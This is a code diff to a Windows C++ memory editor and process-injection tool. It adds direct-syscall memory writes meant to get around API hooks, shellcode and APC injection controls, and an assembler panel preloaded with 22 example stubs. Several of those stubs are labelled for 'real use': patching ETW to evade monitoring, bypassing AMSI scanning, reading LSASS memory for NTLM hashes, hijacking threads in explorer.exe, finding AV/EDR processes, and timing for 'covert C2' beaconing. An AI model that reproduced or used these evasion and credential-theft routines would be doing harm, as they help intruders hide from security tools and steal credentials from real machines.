@@ -13,6 +13,7 @@
 #include <stdint.h>
 #include <math.h>
 #include <richedit.h>
+#include <inttypes.h>
 
 #ifndef EM_SETBKGNDCOLOR
 #define EM_SETBKGNDCOLOR (WM_USER+67)
@@ -103,6 +104,7 @@ typedef struct {
 #define ID_EDIT_ASM_OUT     83
 #define ID_BTN_ASM_TO_SC    84
 
+
 #define ID_BTN_COPY_HEX        90
 #define ID_BTN_COPY_RESULTS    91
 #define ID_BTN_COPY_ADDR       92
@@ -125,6 +127,7 @@ typedef struct {
 #define ID_TAB_CTRL          200
 #define ID_BTN_WRITE_ALL     201
 #define ID_CHK_PROTECT_WR    230
+#define ID_CHK_SYSCALL_WR    248
 #define ID_BTN_SUSPEND_THR   231
 #define ID_BTN_RESUME_THR    232
 #define ID_BTN_KILL_THREAD   233
@@ -145,6 +148,34 @@ typedef struct {
 #define ID_BTN_WND_MAX       227
 #define ID_BTN_WND_RESTORE   228
 #define ID_BTN_WND_CLOSE_W   229
+
+#define ID_LST_DETECT        240
+#define ID_BTN_DETECT_SCAN   241
+#define ID_BTN_DETECT_COPY   242
+#define ID_BTN_DETECT_CLEAR  243
+#define ID_CHK_DETECT_RX     244
+#define ID_CHK_DETECT_STOMP  245
+#define ID_CHK_DETECT_MAPPED 246
+#define ID_CHK_DETECT_THREAD 247
+#define ID_CHK_DETECT_RWX    260
+#define ID_CHK_DETECT_MANMAP 261
+#define ID_CHK_DETECT_HIJACK 262
+#define ID_CHK_DETECT_PATH   263
+#define ID_BTN_EXEC_SHELLCODE 248
+#define ID_BTN_DUMP_SELECTED  249
+#define ID_EDIT_DUMP          250
+#define ID_CMB_EXEC_METHOD    251
+#define ID_EDIT_THREAD_ID     252
+#define ID_BTN_EXEC_APC       253
+#define ID_EDIT_SC_DLL_PATH   254
+#define ID_EDIT_SC_EXPORT_FUNC 255
+#define ID_BTN_SC_EXEC_DLL_EXPORT 256
+#define ID_BTN_SC_BROWSE_DLL  257
+
+#define ID_BTN_HELP_MODULES     300
+#define ID_BTN_HELP_INJECT      301
+#define ID_BTN_HELP_WNDWRITER   302
+#define ID_BTN_HELP_SHELLCODE   303
 
 #define TIMER_FREEZE        100
 #define TIMER_WATCH         101
@@ -185,7 +216,7 @@ HWND hScanResultsWnd, hMemoryMapWnd, hHexViewWnd;
 HWND hLstWatchList, hLstModules, hLstCaves, hLstThreads;
 
 HWND hEditPID, hEditScanValue, hEditNewValue, hEditHexAddress;
-HWND hEditSearchName, hEditTrackedOffset;
+HWND hEditSearchName, hEditTrackedOffset, hEditShellAddr, hCmbExecMethod, hEditThreadId, hEditScDllPath, hEditScExportFunc;
 HWND hBtnFirstScan, hBtnNextScan, hBtnWrite, hBtnUndo, hBtnRefreshHex;
 HWND hBtnSetOffset, hBtnGotoOffset, hBtnFreeze, hBtnExport;
 HWND hStaticProcessInfo, hStaticModuleInfo, hStaticAddressInfo, hStatusWnd;
@@ -209,9 +240,14 @@ HWND hHdrWndWriter, hLstWindows, hEditWndText;
 
 HWND hStaticSelWnd, hEditWndMsg, hEditWndWParam, hEditWndLParam, hEditWndCmdId;
 
-HWND hTabCtrl, hPageScan, hPageMods, hPageInject, hPageWnd;
+HWND hTabCtrl, hPageScan, hPageMods, hPageInject, hPageWnd, hPageDetect, hPageShellcode;
+HWND hLstDetect, hHdrDetect, hEditDump;
+HWND hBtnDetectScan, hBtnDetectCopy, hBtnDetectClear, hBtnExecShellcode, hBtnDumpSelected, hBtnExecDllExport, hBtnExecAPC;
+HWND hChkDetectRx, hChkDetectStomp, hChkDetectMapped, hChkDetectThread;
+HWND hChkDetectRwx, hChkDetectManMap, hChkDetectHijack, hChkDetectPath;
 
 HWND hChkProtect;
+HWND hChkSyscall;
 
 HWND hWndAssembler = NULL;
 HFONT hFontTitle, hFontSection, hFontNormal, hFontMono, hFontSmall;
@@ -265,20 +301,23 @@ std::string FormatMemorySize(SIZE_T bytes);
 LPVOID GetBaseAddress();
 int    ReadValueFromAddress(LPVOID address);
 void   WriteValueToAddress(LPVOID address, int value);
+bool WriteTypedValue(LPVOID address, const char* str, int dt, bool protect, bool useSyscall=false);
+void WriteStringToAddress(LPVOID address, bool utf16, bool useSyscall=false);
+static bool SyscallWriteVirtualMemory(HANDLE process, PVOID baseAddress, const void* buffer, SIZE_T bufferSize, SIZE_T* bytesWritten);
+static bool SyscallProtectVirtualMemory(HANDLE process, PVOID baseAddress, SIZE_T regionSize, DWORD newProtect, DWORD* oldProtect);
 
 void CopyEditToClipboard(HWND hEdit);
 void AppendEditText(HWND hEdit, const char* line);
 void SetEditText(HWND hEdit, const char* text);
 void ReadStringAtAddress(LPVOID address);
-void WriteStringToAddress(LPVOID address, bool utf16);
 void DoAobPatchReplace();
 void EnumerateProcessWindows();
-bool WriteTypedValue(LPVOID address, const char* str, int dt, bool protect);
 void WriteAllScanResults();
 void SuspendResumeProcess(bool suspend);
 void InjectIntoCodeCave();
 void KillSelectedThread();
 void UpdateSelectedWindowInfo(HWND target);
+void RunInjectionDetection();
 
 static void EnableDebugPrivilege() {
     HANDLE hToken;
@@ -354,6 +393,7 @@ void AppendEditText(HWND hEdit, const char* line) {
     SendMessage(hEdit,EM_SETCHARFORMAT,SCF_SELECTION,(LPARAM)&cf);
     if (len>0) SendMessageA(hEdit, EM_REPLACESEL, FALSE, (LPARAM)"\r\n");
     SendMessageA(hEdit, EM_REPLACESEL, FALSE, (LPARAM)line);
+    SendMessage(hEdit, EM_SCROLLCARET, 0, 0);
 }
 
 void SetEditText(HWND hEdit, const char* text) {
@@ -693,32 +733,58 @@ void ReadStringAtAddress(LPVOID address){
 }
 
 
-void WriteStringToAddress(LPVOID address,bool utf16){
+void WriteStringToAddress(LPVOID address,bool utf16,bool useSyscall){
     if(!hProcess||!address){LogToStatus("Select an address first",true);return;}
     char txt[512]={};
     GetWindowTextA(hEditStrWrite,txt,512);
     if(!txt[0]){LogToStatus("Enter string text first",true);return;}
 
+    bool protect = (SendMessage(hChkProtect,BM_GETCHECK,0,0)==BST_CHECKED);
+    DWORD oldProt = 0;
+    SIZE_T writeLen = 0;
+    std::vector<wchar_t> wide;
+    if (!utf16) {
+        writeLen = strlen(txt) + 1;
+    } else {
+        int needed = MultiByteToWideChar(CP_UTF8,0,txt,-1,NULL,0);
+        if (needed <= 0){LogToStatus("Conversion failed",true);return;}
+        wide.assign(needed,0);
+        MultiByteToWideChar(CP_UTF8,0,txt,-1,wide.data(),needed);
+        writeLen = (SIZE_T)needed * sizeof(wchar_t);
+    }
+    if (protect) {
+        if (useSyscall) {
+            if (!SyscallProtectVirtualMemory(hProcess,address,writeLen,PAGE_EXECUTE_READWRITE,&oldProt)){
+                LogToStatus("Unable to change protection via syscall",true);return;
+            }
+        } else {
+            if (!VirtualProtectEx(hProcess,address,writeLen,PAGE_EXECUTE_READWRITE,&oldProt)){
+                LogToStatus("Unable to change protection",true);return;
+            }
+        }
+    }
+
     if(!utf16){
-       
         SIZE_T len=strlen(txt)+1;
         SIZE_T w;
-        if(WriteProcessMemory(hProcess,address,txt,len,&w)){
-            char buf[256];sprintf_s(buf,"Wrote UTF-8 string (%zu bytes) to 0x%p",len,address);
+        bool ok = useSyscall ? SyscallWriteVirtualMemory(hProcess,address,txt,len,&w)
+                             : WriteProcessMemory(hProcess,address,txt,len,&w);
+        if(ok){
+            char buf[256];sprintf_s(buf,"Wrote UTF-8 string (%zu bytes) to 0x%p%s",len,address,useSyscall?" (syscall)":"");
             LogToStatus(buf);ShowHexAtAddress(address,address);
         }else LogToStatus("Write failed",true);
     }else{
-        
-        int needed=MultiByteToWideChar(CP_UTF8,0,txt,-1,NULL,0);
-        if(needed<=0){LogToStatus("Conversion failed",true);return;}
-        std::vector<wchar_t> wide(needed);
-        MultiByteToWideChar(CP_UTF8,0,txt,-1,wide.data(),needed);
-        SIZE_T byteLen=(SIZE_T)needed*2;
         SIZE_T w;
-        if(WriteProcessMemory(hProcess,address,wide.data(),byteLen,&w)){
-            char buf[256];sprintf_s(buf,"Wrote UTF-16LE string (%d wchars, %zu bytes) to 0x%p",needed,(size_t)w,address);
+        bool ok = useSyscall ? SyscallWriteVirtualMemory(hProcess,address,wide.data(),writeLen,&w)
+                             : WriteProcessMemory(hProcess,address,wide.data(),writeLen,&w);
+        if(ok){
+            char buf[256];sprintf_s(buf,"Wrote UTF-16LE string (%zu bytes) to 0x%p%s",writeLen,address,useSyscall?" (syscall)":"");
             LogToStatus(buf);ShowHexAtAddress(address,address);
         }else LogToStatus("Write failed",true);
+    }
+    if (protect && oldProt) {
+        if (useSyscall) SyscallProtectVirtualMemory(hProcess,address,writeLen,oldProt,nullptr);
+        else VirtualProtectEx(hProcess,address,writeLen,oldProt,&oldProt);
     }
 }
 
@@ -930,7 +996,7 @@ void DoFirstScan(){
     if(sc==SC_EXACT&&dt!=DT_STRING&&dt!=DT_AOB){
         if(dt==DT_FLOAT){float v=(float)atof(valueStr);memcpy(targetBuf,&v,4);}
         else if(dt==DT_DOUBLE){double v=atof(valueStr);memcpy(targetBuf,&v,8);}
-        else if(dt==DT_INT64){int64_t v=(int64_t)_atoi64(valueStr);memcpy(targetBuf,&v,8);}
+        else if(dt==DT_INT64){int64_t v=_strtoi64(valueStr,NULL,10);memcpy(targetBuf,&v,8);}
         else{int32_t v=atoi(valueStr);
             if(dt==DT_INT8){int8_t b=(int8_t)v;memcpy(targetBuf,&b,1);}
             else if(dt==DT_INT16){int16_t b=(int16_t)v;memcpy(targetBuf,&b,2);}
@@ -1021,7 +1087,7 @@ void DoNextScan(){
     if(sc==SC_EXACT&&dt!=DT_STRING&&dt!=DT_AOB){
         if(dt==DT_FLOAT){float v=(float)atof(valueStr);memcpy(targetBuf,&v,4);}
         else if(dt==DT_DOUBLE){double v=atof(valueStr);memcpy(targetBuf,&v,8);}
-        else if(dt==DT_INT64){int64_t v=(int64_t)_atoi64(valueStr);memcpy(targetBuf,&v,8);}
+        else if(dt==DT_INT64){int64_t v=_strtoi64(valueStr,NULL,10);memcpy(targetBuf,&v,8);}
         else{int32_t v=atoi(valueStr);
             if(dt==DT_INT8){int8_t b=(int8_t)v;memcpy(targetBuf,&b,1);}
             else if(dt==DT_INT16){int16_t b=(int16_t)v;memcpy(targetBuf,&b,2);}
@@ -1233,7 +1299,7 @@ void InjectShellcode(){
     if(!WriteProcessMemory(hProcess,remoteMem,scBytes.data(),scBytes.size(),&written)){
         VirtualFreeEx(hProcess,remoteMem,0,MEM_RELEASE);LogToStatus("WriteProcessMemory failed",true);return;}
     HANDLE hThread=CreateRemoteThread(hProcess,nullptr,0,(LPTHREAD_START_ROUTINE)remoteMem,nullptr,0,nullptr);
-    if(!hThread){char buf[128];sprintf_s(buf,"CreateRemoteThread (shellcode) failed: %lu",GetLastError());
+    if(!hThread){char buf[256];sprintf_s(buf,"CreateRemoteThread (shellcode) failed: %lu",GetLastError());
         LogToStatus(buf,true);return;}
     char buf[256];sprintf_s(buf,"Shellcode (%zu bytes) executing at 0x%p",scBytes.size(),remoteMem);
     LogToStatus(buf);CloseHandle(hThread);ShowHexAtAddress(remoteMem,remoteMem);
@@ -1439,13 +1505,312 @@ LRESULT CALLBACK AsmWndProc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
             10,28,660,270,hWnd,(HMENU)ID_EDIT_ASM_SRC,hInst,NULL);
         SendMessage(hSrc,WM_SETFONT,(WPARAM)fMono,TRUE);
         SetWindowTextA(hSrc,
-            "Example: write UTF-16 filename string to address\r\n"
+            "Example 1: write UTF-16 filename string to address\r\n"
             "; Use String Writer panel in main window instead for most string tasks\r\n"
             "push rax\r\n"
             "mov rax, 0x00007FF1ABCD1234  ; replace with your found address\r\n"
             "mov dword [rax], 9999\r\n"
             "pop rax\r\n"
-            "ret");
+            "ret\r\n\r\n"
+
+            "Example 2: Syscall stub for NtWriteVirtualMemory (SSN=0x3A on Win10 x64)\r\n"
+            "; Manually set SSN - use GetNtApiSyscallNumber in code to get it\r\n"
+            "mov eax, 0x3A  ; SSN for NtWriteVirtualMemory\r\n"
+            "syscall\r\n"
+            "ret\r\n\r\n"
+
+            "Example 3: Syscall stub for NtProtectVirtualMemory (SSN=0x50)\r\n"
+            "mov eax, 0x50  ; SSN for NtProtectVirtualMemory\r\n"
+            "syscall\r\n"
+            "ret\r\n\r\n"
+
+            "Example 4: Simple memory write via syscall\r\n"
+            "; Assumes registers set up by caller\r\n"
+            "mov eax, 0x3A  ; NtWriteVirtualMemory SSN\r\n"
+            "syscall\r\n"
+            "ret\r\n\r\n"
+
+            "Example 5: Shellcode to write memory via syscall (NtWriteVirtualMemory)\r\n"
+            "; Allocates executable memory first, then writes a DWORD value\r\n"
+            "; Replace addresses and SSN as needed\r\n"
+            "sub rsp, 0x28  ; Allocate shadow space\r\n"
+            "mov rcx, -1   ; ProcessHandle (current process)\r\n"
+            "mov rdx, 0x00007FF1ABCD0000  ; BaseAddress to write to\r\n"
+            "lea r8, [rel value]  ; Buffer with value\r\n"
+            "mov r9, 4    ; NumberOfBytesToWrite\r\n"
+            "lea rax, [rsp+0x20]  ; NumberOfBytesWritten\r\n"
+            "mov dword [rax], 0\r\n"
+            "mov eax, 0x3A  ; SSN for NtWriteVirtualMemory\r\n"
+            "syscall\r\n"
+            "add rsp, 0x28\r\n"
+            "ret\r\n"
+            "value: dd 12345  ; The value to write\r\n\r\n"
+
+            "Example 6: Shellcode to execute injected code\r\n"
+            "; Assumes shellcode is at allocated address, calls it\r\n"
+            "mov rax, 0x00007FF1ABCD0000  ; Address of injected shellcode\r\n"
+            "call rax\r\n"
+            "ret\r\n\r\n"
+
+            "Example 7: Full inj shellcode (allocate + write + protect)\r\n"
+            "; Allocates memory, writes shellcode, protects as executable, executes\r\n"
+            "sub rsp, 0x38\r\n"
+            "; Allocate memory\r\n"
+            "mov rcx, -1\r\n"
+            "xor rdx, rdx\r\n"
+            "mov r8, 0x1000  ; Size\r\n"
+            "mov r9, 0x1000  ; AllocationType (MEM_COMMIT)\r\n"
+            "push 0x40  ; Protect (PAGE_EXECUTE_READWRITE)\r\n"
+            "lea rax, [rsp+0x30]\r\n"
+            "mov [rax], rsp\r\n"
+            "mov eax, 0x18  ; SSN for NtAllocateVirtualMemory\r\n"
+            "syscall\r\n"
+            "; Write shellcode\r\n"
+            "mov rcx, -1\r\n"
+            "mov rdx, [rsp+0x30]  ; Allocated address\r\n"
+            "lea r8, [rel payload]\r\n"
+            "mov r9, payload_end - payload\r\n"
+            "lea rax, [rsp+0x28]\r\n"
+            "mov dword [rax], 0\r\n"
+            "mov eax, 0x3A\r\n"
+            "syscall\r\n"
+            "; Protect as executable (remove write permission)\r\n"
+            "mov rcx, -1\r\n"
+            "lea rdx, [rsp+0x30]\r\n"
+            "lea r8, [rsp+0x20]\r\n"
+            "mov r9, 0x20  ; PAGE_EXECUTE_READ\r\n"
+            "mov [r8], rdx\r\n"
+            "mov rax, [rdx]\r\n"
+            "mov [rsp+0x28], rax\r\n"
+            "mov eax, 0x50\r\n"
+            "syscall\r\n"
+            "; Execute\r\n"
+            "call [rsp+0x30]\r\n"
+            "add rsp, 0x38\r\n"
+            "ret\r\n"
+            "payload:\r\n"
+            "  mov rax, 42  ; Example payload\r\n"
+            "  ret\r\n"
+            "payload_end:\r\n\r\n"
+
+            "Example 8: Sleep for 5 seconds using NtDelayExecution (SSN=0x34 on Win10 x64)\r\n"
+            "; Real use: stealthy delay before beaconing or after an evasion attempt\r\n"
+            "push rax\r\n"
+            "mov rax, 0xFFFFFFFFFB2CB000  ; -5,000,0000 * 100ns (5 seconds)\r\n"
+            "push rax\r\n"
+            "mov rcx, rsp                ; Pointer to negative timeout\r\n"
+            "mov eax, 0x34               ; SSN for NtDelayExecution\r\n"
+            "syscall\r\n"
+            "pop rax                     ; Clean up stack\r\n"
+            "pop rax\r\n"
+            "ret\r\n\r\n"
+
+            "Example 9: XOR decryption of embedded payload (real: decrypts 'Hello World' and calls MessageBoxA)\r\n"
+            "; Decrypts a string XOR 0xAA then calls MessageBoxA (no external deps assumed)\r\n"
+            "sub rsp, 0x28\r\n"
+            "lea rsi, [rel encrypted_data]\r\n"
+            "mov rcx, 12                  ; Length of data\r\n"
+            "xor rbx, rbx\r\n"
+            "decrypt_loop:\r\n"
+            "  mov al, [rsi+rbx]\r\n"
+            "  xor al, 0xAA\r\n"
+            "  mov [rsi+rbx], al\r\n"
+            "  inc rbx\r\n"
+            "  loop decrypt_loop\r\n"
+            "; Now call MessageBoxA with the decrypted string\r\n"
+            "xor rcx, rcx                 ; hWnd = NULL\r\n"
+            "lea rdx, [rel encrypted_data]; lpText (now decrypted)\r\n"
+            "lea r8, [rel caption]        ; lpCaption\r\n"
+            "xor r9, r9                   ; uType = MB_OK\r\n"
+            "mov rax, 0x7FFE12340000      ; Replace with real user32!MessageBoxA address\r\n"
+            "call rax\r\n"
+            "add rsp, 0x28\r\n"
+            "ret\r\n"
+            "encrypted_data: db 0xE2, 0x8F, 0x8A, 0x8F, 0xE2, 0x8D, 0x8A, 0x8E, 0x8E, 0xE2, 0x90, 0x8F ; 'Hello World' XOR 0xAA\r\n"
+            "caption: db 'Decrypted', 0\r\n\r\n"
+
+            "Example 10: Query system time (NtQuerySystemInformation, SystemTimeOfDayInformation)\r\n"
+            "; Real use: calculate uptime or timestamp for covert C2\r\n"
+            "sub rsp, 0x30\r\n"
+            "mov rcx, 0x03                 ; SystemTimeOfDayInformation class\r\n"
+            "lea rdx, [rsp+0x20]           ; Output buffer (16 bytes)\r\n"
+            "mov r8, 0x10                  ; Buffer length\r\n"
+            "mov eax, 0x36                 ; SSN for NtQuerySystemInformation (Win10 x64)\r\n"
+            "syscall\r\n"
+            "mov rax, [rsp+0x20]           ; Low part of time\r\n"
+            "mov rdx, [rsp+0x28]           ; High part\r\n"
+            "add rsp, 0x30\r\n"
+            "ret\r\n\r\n"
+
+            "Example 11: Read process memory via NtReadVirtualMemory (get data from another process)\r\n"
+            "; Real use: read lsass or game memory (requires handle with PROCESS_VM_READ)\r\n"
+            "mov [rsp+0x20], r9            ; Save requested size\r\n"
+            "sub rsp, 0x28\r\n"
+            "mov r9, [rsp+0x50]            ; BytesToRead (original param)\r\n"
+            "lea rax, [rsp+0x48]           ; Pointer to BytesRead output\r\n"
+            "push rax\r\n"
+            "sub rsp, 0x20\r\n"
+            "mov rcx, rcx                  ; ProcessHandle\r\n"
+            "mov rdx, rdx                  ; BaseAddress\r\n"
+            "mov r8, r8                    ; Buffer\r\n"
+            "mov r9, r9                    ; NumberOfBytesToRead\r\n"
+            "mov eax, 0x3F                 ; SSN for NtReadVirtualMemory\r\n"
+            "syscall\r\n"
+            "add rsp, 0x20\r\n"
+            "pop rax\r\n"
+            "add rsp, 0x28\r\n"
+            "ret\r\n\r\n"
+
+            "Example 12: Patch a single byte in current process memory (write via direct dereference)\r\n"
+            "; Real use: change a conditional jump to NOP or modify a flag\r\n"
+            "push rax\r\n"
+            "mov rax, 0x00007FF1ABCD1234   ; Address to patch\r\n"
+            "mov byte [rax], 0x90          ; Patch with NOP\r\n"
+            "pop rax\r\n"
+            "ret\r\n\r\n"
+
+            "Example 13: Patch a DWORD value using NtProtectVirtualMemory + write (change game health/ammo)\r\n"
+            "; Real use: cheat engine style memory editing with proper protection restoration\r\n"
+            "sub rsp, 0x38\r\n"
+            "; 1. Change protection to PAGE_READWRITE\r\n"
+            "mov rcx, -1                   ; Current process\r\n"
+            "lea rdx, [rel target_addr]    ; Address variable (holds 0x00007FF1ABCD0000)\r\n"
+            "lea r8, [rsp+0x30]            ; OldProtect output\r\n"
+            "mov r9, 0x04                  ; PAGE_READWRITE\r\n"
+            "mov [r8], r9                  ; Placeholder\r\n"
+            "mov eax, 0x50                 ; NtProtectVirtualMemory SSN\r\n"
+            "syscall\r\n"
+            "; 2. Write new DWORD value\r\n"
+            "mov rcx, [rel target_addr]\r\n"
+            "mov dword [rcx], 9999         ; New value (e.g., ammo)\r\n"
+            "; 3. Restore original protection\r\n"
+            "mov rcx, -1\r\n"
+            "lea rdx, [rel target_addr]\r\n"
+            "lea r8, [rsp+0x28]            ; OldProtect (from step 1)\r\n"
+            "mov r9, [rsp+0x30]            ; Original protection\r\n"
+            "mov eax, 0x50\r\n"
+            "syscall\r\n"
+            "add rsp, 0x38\r\n"
+            "ret\r\n"
+            "target_addr: dq 0x00007FF1ABCD0000  ; Replace with real address\r\n\r\n"
+
+            "Example 14: Get module base address via PEB walk (no syscalls, pure shellcode)\r\n"
+            "; Real use: find kernel32 base without using GetModuleHandle (evasive)\r\n"
+            "xor rcx, rcx\r\n"
+            "mov rcx, gs:[0x60]            ; PEB\r\n"
+            "mov rcx, [rcx+0x18]           ; LDR\r\n"
+            "mov rcx, [rcx+0x20]           ; InMemoryOrderModuleList (first module)\r\n"
+            "mov rcx, [rcx]                ; Second module (ntdll)\r\n"
+            "mov rcx, [rcx]                ; Third module (kernel32)\r\n"
+            "mov rax, [rcx+0x20]           ; ImageBaseAddress\r\n"
+            "ret\r\n\r\n"
+
+            "Example 15: Query process handle count using NtQueryInformationProcess\r\n"
+            "; Real use: detect handle dumping or debugger presence (low handle count?)\r\n"
+            "sub rsp, 0x30\r\n"
+            "mov rcx, -1                   ; Current process handle\r\n"
+            "mov rdx, 0x15                 ; ProcessHandleCount (info class 0x15)\r\n"
+            "lea r8, [rsp+0x20]            ; Output buffer (ULONG)\r\n"
+            "mov r9, 0x08                  ; Buffer size\r\n"
+            "mov eax, 0x38                 ; NtQueryInformationProcess SSN\r\n"
+            "syscall\r\n"
+            "mov eax, [rsp+0x20]           ; Handle count\r\n"
+            "add rsp, 0x30\r\n"
+            "ret\r\n\r\n"
+
+            "Example 16: Patch a conditional jump to always take branch (force true)\r\n"
+            "; Real use: bypass anti-debug or anti-tamper checks\r\n"
+            "push rax\r\n"
+            "mov rax, 0x00007FF1ABCD1000   ; Address of conditional jump (e.g., je 0x...)\r\n"
+            "mov byte [rax], 0xEB          ; Change to JMP (short)\r\n"
+            "; For long jumps: replace 0x0F84 (JZ rel32) with 0x0F85 (JNZ) or 0x90\x90\x90\x90\x90\xE9\r\n"
+            "pop rax\r\n"
+            "ret\r\n\r\n"
+
+            "Example 17 (banana ccp): Enumerate running processes via NtQuerySystemInformation (SystemProcessInformation)\r\n"
+            "; Real use: detect AV/EDR processes or find target PID for inj\r\n"
+            "sub rsp, 0x1000\r\n"
+            "mov rcx, 0x05                ; SystemProcessInformation class\r\n"
+            "lea rdx, [rsp]               ; Buffer\r\n"
+            "mov r8, 0x1000               ; Initial buffer size\r\n"
+            "lea r9, [rsp+0x0FF8]         ; Return length\r\n"
+            "mov eax, 0x36                ; NtQuerySystemInformation\r\n"
+            "syscall\r\n"
+            "; Walk the process list (simplified – real code would extract PID and name)\r\n"
+            "mov rsi, [rsp]               ; First PROCESS_INFORMATION\r\n"
+            ".loop:\r\n"
+            "  mov ebx, [rsi+0x60]        ; Process ID\r\n"
+            "  lea rdi, [rsi+0x68]        ; Image name (UNICODE_STRING Buffer)\r\n"
+            "  ; ... (collection logic would go here)\r\n"
+            "  mov rsi, [rsi+0x88]        ; Next entry offset\r\n"
+            "  test rsi, rsi\r\n"
+            "  jnz .loop\r\n"
+            "add rsp, 0x1000\r\n"
+            "ret\r\n\r\n"
+
+            "Example 18 (banana ccp): Patch ETW (Event Tracing for Windows) to evade syscall monitoring\r\n"
+            "; Real use: prevent ETW from logging syscall events (stealth)\r\n"
+            "push rax\r\n"
+            "mov rax, gs:[0x60]           ; PEB\r\n"
+            "mov rax, [rax+0x18]          ; LDR\r\n"
+            "mov rax, [rax+0x20]          ; InMemoryOrderModuleList\r\n"
+            "mov rax, [rax]               ; ntdll\r\n"
+            "mov rax, [rax+0x20]          ; ntdll base\r\n"
+            "add rax, 0x12345678          ; RVA to EtwEventWrite (replace with actual offset)\r\n"
+            "mov byte [rax], 0xC3         ; ret instruction\r\n"
+            "pop rax\r\n"
+            "ret\r\n\r\n"
+
+            "Example 19 (banana ccp): Read LSASS process memory to extract credentials (NtReadVirtualMemory)\r\n"
+            "; HIGH RISK – educational only. Requires LSASS handle with PROCESS_VM_READ\r\n"
+            "sub rsp, 0x30\r\n"
+            "mov rcx, rcx                 ; LSASS handle (obtained via OpenProcess with PID=0x2A8 typically)\r\n"
+            "mov rdx, 0x7FF123450000      ; Target address inside LSASS (e.g., credential region)\r\n"
+            "lea r8, [rsp+0x20]           ; Local buffer (size 0x1000)\r\n"
+            "mov r9, 0x1000               ; Bytes to read\r\n"
+            "mov eax, 0x3F                ; NtReadVirtualMemory\r\n"
+            "syscall\r\n"
+            "; Buffer [rsp+0x20] now contains sensitive data (e.g., NTLM hashes)\r\n"
+            "add rsp, 0x30\r\n"
+            "ret\r\n\r\n"
+
+            "Example 20 (banana ccp): Hijack thread execution via APC inj (NtQueueApcThread)\r\n"
+            "; Real use: execute shellcode in the context of an alertable thread (e.g., explorer.exe)\r\n"
+            "sub rsp, 0x28\r\n"
+            "mov rcx, r9                  ; Thread handle (alertable)\r\n"
+            "mov rdx, [rsp+0x48]          ; APC routine (shellcode address)\r\n"
+            "xor r8, r8                   ; SystemArgument1\r\n"
+            "xor r9, r9                   ; SystemArgument2\r\n"
+            "mov eax, 0x4D                ; NtQueueApcThread (SSN varies)\r\n"
+            "syscall\r\n"
+            "add rsp, 0x28\r\n"
+            "ret\r\n\r\n"
+
+            "Example 21 (banana ccp): Patch amsi.dll to disable scanning (AmsiScanBuffer)\r\n"
+            "; Real use: bypass AMSI for in‑memory .NET or PowerShell payloads\r\n"
+            "push rax\r\n"
+            "mov rax, 0x00007FFE12340000  ; Base of amsi.dll (find using PEB walk first)\r\n"
+            "add rax, 0x1A2B3C            ; Offset to AmsiScanBuffer (real offset varies by Windows build)\r\n"
+            "; Patch to 'xor eax, eax ; ret 0x14' – returns AMSI_RESULT_CLEAN\r\n"
+            "mov word [rax], 0x31C0       ; xor eax, eax\r\n"
+            "mov word [rax+2], 0x14C2     ; ret 0x14\r\n"
+            "pop rax\r\n"
+            "ret\r\n\r\n"
+
+            "Example 22 (banana ccp): Install direct system call proxy to bypass user‑land hooks\r\n"
+            "; Real use: call NtWriteVirtualMemory using a fresh, unmodified copy of ntdll\r\n"
+            "; Assumes fresh ntdll base is in R14, SSN for the desired syscall is in R15\r\n"
+            "sub rsp, 0x28\r\n"
+            "mov rcx, -1                  ; ProcessHandle\r\n"
+            "mov rdx, [rsp+0x30]          ; BaseAddress\r\n"
+            "mov r8, [rsp+0x38]           ; Buffer\r\n"
+            "mov r9, [rsp+0x40]           ; NumberOfBytes\r\n"
+            "lea rax, [rsp+0x20]          ; BytesWritten output\r\n"
+            "mov [rax], 0\r\n"
+            "mov eax, r15d                ; SSN (from fresh ntdll)\r\n"
+            "syscall\r\n"
+            "add rsp, 0x28\r\n"
+            "ret\r\n\r\n");
         HWND hBtn=CreateWindowA("BUTTON","Assemble",WS_CHILD|WS_VISIBLE,10,308,110,26,hWnd,(HMENU)ID_BTN_ASSEMBLE,hInst,NULL);
         SendMessage(hBtn,WM_SETFONT,(WPARAM)fNorm,TRUE);
         hErr=CreateWindowA("STATIC","",WS_CHILD|WS_VISIBLE,130,314,550,18,hWnd,NULL,hInst,NULL);
@@ -1539,7 +1904,59 @@ LRESULT CALLBACK ScanEditSubclassProc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lP
     return CallWindowProcA(g_origScanEditProc,hWnd,msg,wParam,lParam);
 }
 
-bool WriteTypedValue(LPVOID address, const char* str, int dt, bool protect) {
+static DWORD GetNtApiSyscallNumber(const char* procName) {
+    HMODULE hNt = GetModuleHandleA("ntdll.dll");
+    if (!hNt) return 0;
+    FARPROC proc = GetProcAddress(hNt, procName);
+    if (!proc) return 0;
+    unsigned char* code = (unsigned char*)proc;
+    if (code[0]==0x4C && code[1]==0x8B && code[2]==0xD1 && code[3]==0xB8) {
+        return *(DWORD*)(code + 4);
+    }
+    return 0;
+}
+
+static LPVOID BuildSyscallStub(DWORD ssn) {
+    unsigned char stub[] = { 0x4C,0x8B,0xD1,0xB8,0,0,0,0,0x0F,0x05,0xC3 };
+    LPVOID mem = VirtualAlloc(NULL, sizeof(stub), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!mem) return nullptr;
+    memcpy(mem, stub, sizeof(stub));
+    *(DWORD*)((unsigned char*)mem + 4) = ssn;
+    FlushInstructionCache(GetCurrentProcess(), mem, sizeof(stub));
+    return mem;
+}
+
+typedef LONG NTSTATUS;
+typedef NTSTATUS (NTAPI* NtWriteVirtualMemory_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
+typedef NTSTATUS (NTAPI* NtProtectVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
+
+static bool SyscallWriteVirtualMemory(HANDLE process, PVOID baseAddress, const void* buffer, SIZE_T bufferSize, SIZE_T* bytesWritten) {
+    DWORD ssn = GetNtApiSyscallNumber("NtWriteVirtualMemory");
+    if (!ssn) return false;
+    LPVOID stub = BuildSyscallStub(ssn);
+    if (!stub) return false;
+    auto fn = (NtWriteVirtualMemory_t)stub;
+    NTSTATUS status = fn(process, baseAddress, const_cast<void*>(buffer), bufferSize, bytesWritten);
+    VirtualFree(stub, 0, MEM_RELEASE);
+    return status >= 0 && (!bytesWritten || *bytesWritten == bufferSize);
+}
+
+static bool SyscallProtectVirtualMemory(HANDLE process, PVOID baseAddress, SIZE_T regionSize, DWORD newProtect, DWORD* oldProtect) {
+    DWORD ssn = GetNtApiSyscallNumber("NtProtectVirtualMemory");
+    if (!ssn) return false;
+    LPVOID stub = BuildSyscallStub(ssn);
+    if (!stub) return false;
+    auto fn = (NtProtectVirtualMemory_t)stub;
